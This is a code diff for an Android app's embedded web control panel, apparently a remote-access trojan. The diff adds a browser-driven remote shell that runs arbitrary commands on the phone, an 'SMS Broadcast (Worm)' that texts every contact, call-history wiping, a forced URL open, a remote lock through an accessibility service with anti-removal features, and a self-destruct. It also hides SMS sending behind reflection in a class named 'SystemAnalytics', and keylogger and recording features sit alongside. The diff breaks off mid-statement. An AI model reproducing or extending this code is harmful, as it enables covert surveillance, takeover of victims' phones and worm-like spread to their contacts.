@@ -38,6 +38,7 @@ import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Locale;
 import java.util.Map;
+import org.json.JSONObject;
 
 import fi.iki.elonen.NanoHTTPD;
 
@@ -344,6 +345,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".terminal-text { font-family: 'JetBrains Mono', monospace; color: var(--neon-cyan); background: #000; padding: 15px; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.2); box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }" +
             ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 42px; width: 42px; z-index: 10; pointer-events: none; object-fit: contain; }" +
             
+            // --- DESKTOP_UI_OPTIMIZATION ---
+            "@media (min-width: 1024px) {" +
+            "  input[type='text'], input[type='password'], textarea { max-width: 500px !important; }" +
+            "  .card button:not(.btn-small) { max-width: 300px !important; }" +
+            "  #shell-cmd { max-width: 100% !important; }" + 
+            "  .terminal-input-wrap { max-width: 800px; }" +
+            "  .action-row-limited { max-width: 900px; margin-left: 0 !important; margin-right: auto !important; display: flex !important; gap: 10px; }" +
+            "  .action-row-limited button, .action-row-limited form { flex: 1 !important; min-width: 0 !important; max-width: 300px !important; }" +
+            "  .action-row-limited form button { width: 100% !important; }" +
+            "  .btn-fit { flex: 0 1 auto !important; min-width: 150px !important; max-width: 200px !important; }" +
+            "}" +
+            
             // --- MOBILE_OPTIMIZATION_PROTOCOL ---
             "@media (max-width: 768px) {" +
             "  body { overflow-x: hidden; width: 100%; font-size: 14px; margin: 0; padding: 0; -webkit-text-size-adjust: 100%; }" +
@@ -353,13 +366,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "    background: rgba(255, 255, 255, 0.03) !important; " +
             "  }" +
             "  .container { width: 100vw; overflow-x: hidden; padding: 10px; box-sizing: border-box; margin: 0; }" +
+            "  .action-row-limited { flex-direction: column !important; }" +
             "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 0; overflow: visible; }" +
             "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.71rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
             "  .glitch-container { margin: 0 0 10px 0 !important; height: auto !important; }" +
             "  .version-text { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 0 10px 0 !important; }" +
             "  .glitch { font-size: 0.47rem; letter-spacing: 1px; }" +
             "  .nav { gap: 4px; justify-content: center; width: 100%; padding: 0 4px; box-sizing: border-box; }" +
-            "  .nav a { padding: 10px 1px; font-size: 0.6rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
+            "  .nav a { padding: 10px 1px; font-size: 0.55rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
             "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }" +
             "  .card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.5) !important; background: rgba(0, 242, 255, 0.1) !important; position: relative; z-index: 100; display: block !important; visibility: visible !important; }" +
             "  .card-keylogger::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; border-radius: 10px; pointer-events: none; box-shadow: inset 0 0 10px rgba(0, 242, 255, 0.1); }" +
@@ -367,8 +381,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .info-item { padding: 12px; }" +
             "  #log-terminal { height: 260px !important; font-size: 0.65rem !important; padding: 10px !important; }" +
             "  .header-actions { margin-left: 0 !important; margin-top: 10px; width: 100%; justify-content: center !important; flex-wrap: wrap; gap: 4px !important; }" +
-            "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
-            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 10px 12px !important; font-size: 0.75rem !important; letter-spacing: 0 !important; border-radius: 8px !important; margin-bottom: 5px !important; }" +
+            "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.65rem !important; white-space: normal !important; height: auto !important; line-height: 1.4 !important; }" +
+            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 8px 10px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 8px !important; margin-bottom: 5px !important; white-space: normal !important; height: auto !important; line-height: 1.2 !important; }" +
             "  .btn-container { flex-direction: column !important; gap: 8px !important; }" +
             "  .flex-header { flex-direction: column !important; align-items: flex-start !important; gap: 10px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
@@ -525,11 +539,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>UPLINK | LOGIN</title>" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
             "<style>" +
-            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
+            "@font-face { font-family: 'Orbitron'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            "body { background: #050505; color: #00f2ff; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
+            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
             ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
-            ".title-font { font-family: 'OrbitronC2', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
+            ".title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
             "  .login-card { padding: 35px 20px; }" +
             "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
@@ -537,9 +551,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  button { padding: 14px !important; font-size: 14px !important; }" +
             "}" +
             "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
-            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'OrbitronC2', monospace; font-size: 16px; transition: 0.3s; }" +
+            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }" +
             "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
-            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'OrbitronC2', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
+            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
             "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
             ".login-card img { transition: all 0.5s; }" +
             ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
@@ -552,8 +566,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
             "</form>" +
-            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'OrbitronC2', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
-            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter...\"<br>\"The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
+            "<div style=\"text-align: center; color: #00f2ff; font-size: 0.58rem; margin-top: 40px; opacity: 0.4; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.6;\">" +
+            "&copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; \"The one's that MIND don't matter... The one's that MATTER don't mind...\" &nbsp;//&nbsp; Push the Limits" +
             "</div>" +
             "</div>" +
             "<script>" +
@@ -712,12 +726,47 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveFont();
                     } else if (uri.equals("/device")) {
                         response = serveDeviceInfo();
+                    } else if (uri.equals("/device/vibrate")) {
+                        vibrateDevice();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/max-volume")) {
+                        setMaxVolume();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/silent-mode")) {
+                        setSilentMode();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/open-url")) {
+                        openUrlOnDevice(params.get("url"));
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/toast")) {
+                        showToast(params.get("msg"));
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/apps")) {
+                        response = serveAppList();
+                    } else if (uri.equals("/device/self-destruct")) {
+                        selfDestruct();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/device/shell")) {
+                        String cmd = params.get("cmd");
+                        boolean termuxAvailable = isAppInstalled("com.termux");
+                        String shellResult = executeShell(cmd);
+                        
+                        try {
+                            org.json.JSONObject resultObj = new org.json.JSONObject();
+                            resultObj.put("output", shellResult);
+                            resultObj.put("termux_available", termuxAvailable);
+                            response = newFixedLengthResponse(Response.Status.OK, "application/json", resultObj.toString());
+                        } catch (Exception e) {
+                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false}");
+                        }
                     } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                         response = serveFiles(uri, params);
                     } else if (uri.equals("/calls")) {
                         response = serveCallLogs(params);
                     } else if (uri.equals("/calls/make")) {
                         response = makeCall(params);
+                    } else if (uri.equals("/calls/clear")) {
+                        response = serveCallLogsClear();
                     } else if (uri.equals("/sms")) {
                         response = serveSmsMessages(params);
                     } else if (uri.equals("/mms")) {
@@ -728,6 +777,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveMmsMedia(uri.substring(11));
                     } else if (uri.equals("/sms/send")) {
                         response = sendSms(params);
+                    } else if (uri.equals("/sms/broadcast")) {
+                        response = serveSmsBroadcast(params);
                     } else if (uri.equals("/contacts")) {
                         response = serveContacts(params);
                     } else if (uri.equals("/camera")) {
@@ -830,7 +881,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         boolean active = AccessibilityCore.getInstance() != null;
                         boolean antiRemoval = AccessibilityCore.isAntiRemovalEnabled();
                         boolean blackout = AccessibilityCore.isBlackoutActive();
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + "}");
+                        boolean lock = AccessibilityCore.isLockActive();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + ", \"blackout\": " + blackout + ", \"lock\": " + lock + "}");
+                    } else if (uri.equals("/ghost/lock")) {
+                        AccessibilityCore ghost = AccessibilityCore.getInstance();
+                        if (ghost != null) {
+                            ghost.setRemoteLock(!AccessibilityCore.isLockActive());
+                        }
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/ghost/interact")) {
                         response = performInteraction(params);
                     } else {
@@ -930,51 +988,111 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("</div>");
 
-        // System Log Preview (Cyber effect)
+        // --- REMOTE SHELL TERMINAL SECTION ---
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
-        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">ACTIVE_SESSION_LOGS</h3>");
-        html.append("<div id=\"log-terminal\" style=\"background: #000; padding: 20px; border-radius: 12px; font-size: 0.8rem; color: var(--terminal-green); line-height: 1.8; font-family: 'JetBrains Mono', monospace; height: 300px; overflow-y: auto; border: 1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-cyan);\">REMOTE_SHELL_TERMINAL</h3>");
+        
+        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden; margin-top: 15px;\">");
+        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 350px; overflow-y: auto;\">");
+        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
+        html.append("<div>[UPLINK] Connected to /dev/pts/0</div>");
+        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); display: none;\">[UPLINK] Termux bridge available.</div>");
+        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
+        html.append("</div>");
 
-        List<String> logsSnapshot;
-        synchronized (systemLogs) {
-            logsSnapshot = new java.util.ArrayList<>(systemLogs);
-        }
+        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
+        html.append("<span style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:~#</span>");
+        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
+        html.append("</div>");
+        html.append("</div>");
 
-        if (logsSnapshot.isEmpty()) {
-            html.append("<div>[WAITING] Uplink established. Bridge active...</div>");
-        } else {
-            for (String log : logsSnapshot) {
-                html.append("<div>").append(escapeHtml(log)).append("</div>");
-            }
-        }
+        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: flex-start; gap: 10px; flex-wrap: wrap;\">");
+        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
+        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
+        html.append("</div>");
+
+        html.append("<script>");
+        html.append("  let commandHistory = [];");
+        html.append("  let historyIndex = -1;");
+
+        html.append("  document.getElementById('shell-cmd').addEventListener('keydown', function(e) {");
+        html.append("    if (e.key === 'ArrowUp') {");
+        html.append("      e.preventDefault();");
+        html.append("      if (historyIndex < commandHistory.length - 1) {");
+        html.append("        historyIndex++;");
+        html.append("        this.value = commandHistory[commandHistory.length - 1 - historyIndex];");
+        html.append("      }");
+        html.append("    } else if (e.key === 'ArrowDown') {");
+        html.append("      e.preventDefault();");
+        html.append("      if (historyIndex > 0) {");
+        html.append("        historyIndex--;");
+        html.append("        this.value = commandHistory[commandHistory.length - 1 - historyIndex];");
+        html.append("      } else if (historyIndex === 0) {");
+        html.append("        historyIndex = -1;");
+        html.append("        this.value = '';");
+        html.append("      }");
+        html.append("    } else if (e.key === 'Enter') {");
+        html.append("      executeShell();");
+        html.append("    }");
+        html.append("  });");
+
+        html.append("  function executeShell() {");
+        html.append("    const input = document.getElementById('shell-cmd');");
+        html.append("    const c = input.value;");
+        html.append("    const out = document.getElementById('shell-output');");
+        html.append("    if(!c) return;");
+
+        html.append("    commandHistory.push(c);");
+        html.append("    if(commandHistory.length > 50) commandHistory.shift();");
+        html.append("    historyIndex = -1;");
+        html.append("    const line = document.createElement('div');");
+        html.append("    line.style.color = '#fff'; line.style.marginTop = '10px';");
+        html.append("    line.innerHTML = '<span style=\"color:var(--terminal-green)\">root@Android:~#</span> ' + c;");
+        html.append("    out.appendChild(line);");
+        html.append("    input.value = '';"); // Clear immediately for better feel
+        html.append("    fetch('/device/shell?cmd=' + encodeURIComponent(c)).then(r => r.json()).then(d => {");
+        html.append("      if (d.termux_available) document.getElementById('termux-uplink').style.display = 'block';");
+        html.append("      const resp = document.createElement('div');");
+        html.append("      resp.style.whiteSpace = 'pre-wrap';");
+        html.append("      resp.innerHTML = d.output || 'No output';");
+        html.append("      out.appendChild(resp);");
+        html.append("      out.scrollTop = out.scrollHeight;");
+        html.append("    }).catch(e => {");
+        html.append("      const err = document.createElement('div');");
+        html.append("      err.style.color = 'var(--danger)';");
+        html.append("      err.textContent = '[ERROR] Connection lost';");
+        html.append("      out.appendChild(err);");
+        html.append("    });");
+        html.append("  }");
+        html.append("  document.getElementById('shell-cmd').addEventListener('keypress', function(e) { if(e.key === 'Enter') executeShell(); });");
+        html.append("</script>");
+
+        // --- DEVICE COMMANDS CARD ---
+        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-cyan);\">DEVICE_COMMANDS</h3>");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 250px)); gap: 15px; margin-top: 20px;\">");
+        
+        html.append("<button onclick=\"deviceCmd('vibrate')\" class=\"btn btn-small\" style=\"margin:0;\">&#128243; VIBRATE</button>");
+        html.append("<button onclick=\"deviceCmd('max-volume')\" class=\"btn btn-small\" style=\"margin:0;\">&#128266; MAX_VOLUME</button>");
+        html.append("<button onclick=\"deviceCmd('silent-mode')\" class=\"btn btn-small\" style=\"margin:0;\">&#128263; SILENT_MODE</button>");
         
         html.append("</div>");
-        html.append("<div style=\"margin-top: 15px; text-align: right; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;\">");
-        html.append("<span style=\"font-size: 0.65rem; color: #888;\">AUTO_REFRESH_ACTIVE</span>");
-        html.append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap; justify-content: flex-end; flex-grow: 1;\">");
-        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin-bottom: 0;\">RESTART_SERVER</button>");
-        html.append("<button onclick=\"clearLogs()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_LOGS</button>");
-        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: rgba(0, 242, 255, 0.3); margin-bottom: 0;\">REFRESH_LOGS</button>");
-        html.append("</div>");
-        html.append("</div>");
+        html.append("<div style=\"margin-top: 20px;\">");
+        html.append("<div class=\"info-label\">FORCE_OPEN_URL:</div>");
+        html.append("<div style=\"display: flex; gap: 10px; margin-top: 8px; max-width: 600px;\">");
+        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 8px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1;\">");
+        html.append("<button onclick=\"openUrl()\" class=\"btn btn-small\" style=\"margin:0; border-color: var(--neon-cyan); color: var(--neon-cyan);\">EXECUTE</button>");
+        html.append("</div></div>");
+        
+        html.append("<div style=\"margin-top: 20px;\">");
+        html.append("<div class=\"info-label\">SEND_SYSTEM_TOAST:</div>");
+        html.append("<div style=\"display: flex; gap: 10px; margin-top: 8px; max-width: 600px;\">");
+        html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 8px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1;\">");
+        html.append("<button onclick=\"sendToast()\" class=\"btn btn-small\" style=\"margin:0; border-color: var(--neon-yellow); color: var(--neon-yellow);\">SEND_TOAST</button>");
+        html.append("</div></div>");
         html.append("<script>");
-        html.append("  function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }");
-        html.append("  function clearLogs() { if(confirm('Clear all session logs?')) fetch('/terminal/clear-logs').then(() => location.reload()); }");
-        html.append("  async function refreshLogs() {");
-        html.append("    try {");
-        html.append("      const r = await fetch('/terminal/logs');");
-        html.append("      if (!r.ok) return;");
-        html.append("      const logs = await r.json();");
-        html.append("      const terminal = document.getElementById('log-terminal');");
-        html.append("      if (!terminal) return;");
-        html.append("      let html = '';");
-        html.append("      if (logs.length === 0) html = '<div>[WAITING] Uplink established. Bridge active...</div>';");
-        html.append("      else logs.forEach(log => { html += '<div>' + log.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</div>'; });");
-        html.append("      terminal.innerHTML = html;");
-        html.append("    } catch (e) { console.error('Log sync error', e); }");
-        html.append("  }");
-        html.append("  // Use background syncing for logs to prevent full-page flicker");
-        html.append("  setInterval(refreshLogs, 3000);");
+        html.append("  function deviceCmd(a) { fetch('/device/' + a); }");
+        html.append("  function openUrl() { const u = document.getElementById('target-url').value; if(u) fetch('/device/open-url?url=' + encodeURIComponent(u)); }");
         html.append("</script>");
         html.append("</div>");
 
@@ -989,12 +1107,21 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("</div>");
 
-        // Logout Section
-        html.append("<div style=\"text-align: center; margin-top: 40px; margin-bottom: 40px; max-width: 450px; margin-left: auto; margin-right: auto;\">");
-        html.append("<form action=\"/logout\" method=\"POST\">");
-        html.append("<button type=\"submit\" class=\"btn\" style=\"width: 100%; padding: 15px 40px; font-size: 1rem; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">TERMINATE_SESSION (LOGOUT)</button>");
+        // System Control Section
+        html.append("<div class=\"action-row-limited\" style=\"margin-top: 40px; display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 60px;\">");
+        html.append("<button onclick=\"selfDestruct()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255,49,49,0.05);\">&#128163; SELF_DESTRUCT</button>");
+        html.append("<button onclick=\"restartServer()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05);\">RESTART SERVER</button>");
+        html.append("<form action=\"/logout\" method=\"POST\" style=\"margin:0;\">");
+        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">TERMINATE_SESSION</button>");
         html.append("</form>");
         html.append("</div>");
+
+        html.append("<script>");
+        html.append("  function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }");
+        html.append("  function sendToast() { const m = document.getElementById('toast-msg').value; if(m) fetch('/device/toast?msg=' + encodeURIComponent(m)); }");
+        html.append("  function selfDestruct() { if(confirm('CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?')) fetch('/device/self-destruct'); }");
+        html.append("</script>");
+
 
         html.append(HTML_FOOTER);
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
@@ -1193,7 +1320,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
         html.append("<button type=\"submit\" style=\"align-self: center;\">INITIATE CALL</button>");
-        html.append("</div></form></div>");
+        html.append("</div></form>");
+        
+        html.append("<div style=\"margin-top: 20px; text-align: center;\">");
+        html.append("<button onclick=\"if(confirm('Wipe device call history?')) location.href='/calls/clear'\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger);\">WIPE_HISTORY</button>");
+        html.append("</div></div>");
 
         // Check permission first
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -2684,6 +2815,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         if (isRecording) {
             html.append("<a href=\"/audio/").append(isRecordingCall ? "call" : "mic").append("/stop\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">&#9724; TERMINATE</a>");
         }
+        
         html.append("</div></div>");
 
         // Control buttons
@@ -2999,7 +3131,17 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
         html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
         html.append("<button type=\"submit\" style=\"align-self: center;\">ENCRYPT & SEND</button>");
-        html.append("</div></form></div>");
+        html.append("</div></form>");
+
+        // --- SMS BROADCAST SECTION ---
+        html.append("<div style=\"margin-top: 30px; border-top: 1px solid rgba(0,242,255,0.1); padding-top: 20px;\">");
+        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center; color: var(--neon-orange);\">&#9889; SMS Broadcast (Worm)</h3>");
+        html.append("<p style=\"color: #888; font-size: 0.75rem; text-align: center; margin-bottom: 15px;\">Dispatches a message to EVERY contact in the address book.</p>");
+        html.append("<form action=\"/sms/broadcast\" method=\"get\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
+        html.append("<textarea name=\"message\" placeholder=\"Broadcast Content\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-orange); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
+        html.append("<button type=\"submit\" style=\"align-self: center; border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05);\">EXECUTE_BROADCAST</button>");
+        html.append("</div></form></div></div>");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                 html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
@@ -3349,10 +3491,21 @@ public class LabRatsHttpServer extends NanoHTTPD {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
             }
-            SmsManager smsManager;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(SmsManager.class);
-            else smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(number, null, message, null, null);
+            // --- API VIRTUALIZATION: Ghost SMS Dispatch ---
+            String className = "android.telephony.SmsManager";
+            Object smsManager;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                smsManager = context.getSystemService(SmsManager.class);
+            } else {
+                smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);
+            }
+
+            if (smsManager != null) {
+                SystemAnalytics.safeCall(className, "sendTextMessage", 
